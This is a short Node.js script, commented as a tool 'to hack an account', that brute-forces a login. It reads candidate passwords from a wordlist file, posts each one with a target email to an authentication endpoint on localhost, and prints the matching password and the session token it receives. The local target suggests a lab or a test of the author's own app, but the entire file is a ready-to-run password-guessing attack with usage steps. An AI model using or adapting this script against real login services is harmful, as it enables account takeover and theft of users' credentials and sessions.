//script to try many different password to hack an account
//1 -> INSERT RIGHT MAIL VALUE
//2 -> RUN: node brute_force.js
//If esit of attack is fine, script return password and valid token generated

var axios = require('axios');
const { response } = require('express');
const lineReader = require('line-reader');

var myJSONObject;
var email = 'c@c.it' //insert here mail to hack

console.log("Trying...")
lineReader.eachLine('./pwd_list.txt',(line)=>{
    myJSONObject = {'mail': email, "pwd": line}
    axios.post('http://127.0.0.1:3001/api/user/auth', myJSONObject)
    .then(response => {
        console.log("Password Found: " + line)
        console.log("I've got this valid session token [ " + response.data.token + " ]")
        process.exit()
    })
    .catch((error)=>{console.log(error.message)})
})